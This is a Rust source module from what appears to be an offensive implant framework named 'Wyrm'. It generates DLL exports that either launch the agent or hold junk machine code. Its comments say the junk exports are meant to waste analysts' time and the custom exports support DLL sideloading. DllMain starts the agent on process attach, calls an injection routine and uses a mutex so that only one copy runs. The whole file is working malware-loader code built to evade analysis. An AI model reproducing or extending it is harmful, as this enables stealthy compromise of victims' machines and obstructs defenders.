//! A module for creating either fake exports full of junk, or exports which
//! lead to the running of the agent, customisable via profiles - thanks to the
//! magic of macros.
//!
//! This module would be used for two main reasons:
//!
//! 1) Obfuscation: If you wish to obfuscate the binary by enforcing a number of random
//! exports which take analyst time up to review, then you may wish to add a number of
//! junk export functions.
//!
//! 2) Custom entrypoint: If you wish a custom entrypoint which is not `run`, this will
//! allow you to define that - and it will come in handy for custom DLL sideloading.
//

use core::arch::naked_asm;
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};
use core::{mem::transmute, ptr::null_mut};

use windows_sys::Win32::Foundation::{CloseHandle, FALSE, HINSTANCE};
use windows_sys::Win32::Storage::FileSystem::SYNCHRONIZE;
use windows_sys::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
use windows_sys::Win32::System::Threading::{CreateThread, LPTHREAD_START_ROUTINE};
use windows_sys::Win32::System::WindowsProgramming::OpenMutexA;

use crate::injector::inject_current_process;
use crate::utils::generate_mutex_name;

pub static APPLICATION_RUNNING: AtomicBool = AtomicBool::new(false);

pub fn internal_dll_start(start_type: StartType) {
    match start_type {
        StartType::DllMain => start_in_os_thread(),
        StartType::FromExport => {
            if !APPLICATION_RUNNING.load(Ordering::SeqCst) {
                inject_current_process();
            }
        }
    }
}

fn start_in_os_thread() {
    unsafe {
        // If the mutex already exists we dont want to continue setting up Wyrm so just return out the DllMain
        if check_mutex().is_some() {
            return;
        }

        let start = transmute::<LPTHREAD_START_ROUTINE, LPTHREAD_START_ROUTINE>(Some(runpoline));
        let handle = CreateThread(null_mut(), 0, start, null_mut(), 0, null_mut());

        if !handle.is_null() {
            APPLICATION_RUNNING.store(true, Ordering::SeqCst);
        }
    }
}

unsafe extern "system" fn runpoline(_p1: *mut c_void) -> u32 {
    inject_current_process();

    0
}

#[allow(dead_code)]
pub enum StartType {
    DllMain,
    FromExport,
}

/// Returns `Some(())` if the mutex exists on the system
fn check_mutex() -> Option<()> {
    let mutex: &str = option_env!("MUTEX").unwrap_or_default();
    if mutex.is_empty() {
        return None;
    }

    let mtx_name = generate_mutex_name(mutex);

    let existing_handle = unsafe { OpenMutexA(SYNCHRONIZE, FALSE, mtx_name.as_ptr() as *const u8) };

    if !existing_handle.is_null() {
        unsafe { CloseHandle(existing_handle) };
        return Some(());
    }

    None
}

macro_rules! build_dll_export_by_name_start_wyrm {
    ($name:ident) => {
        #[unsafe(no_mangle)]
        unsafe extern "system" fn $name() {
            internal_dll_start(StartType::FromExport);
        }
    };
}

macro_rules! build_dll_export_by_name_junk_machine_code {
    ($name:ident, $($b:expr),+ $(,)?) => {
        #[unsafe(no_mangle)]
        #[unsafe(naked)]
        unsafe extern "system" fn $name() {
            naked_asm!(
                $(
                    concat!(".byte ", stringify!($b)),
                )+
            )
        }
    };
}

include!(concat!(env!("OUT_DIR"), "/custom_exports.rs"));

#[unsafe(no_mangle)]
#[allow(non_snake_case)]
unsafe extern "system" fn DllMain(_hmod_instance: HINSTANCE, dw_reason: u32, _: usize) -> i32 {
    match dw_reason {
        DLL_PROCESS_ATTACH => internal_dll_start(StartType::DllMain),
        _ => (),
    }

    1
}
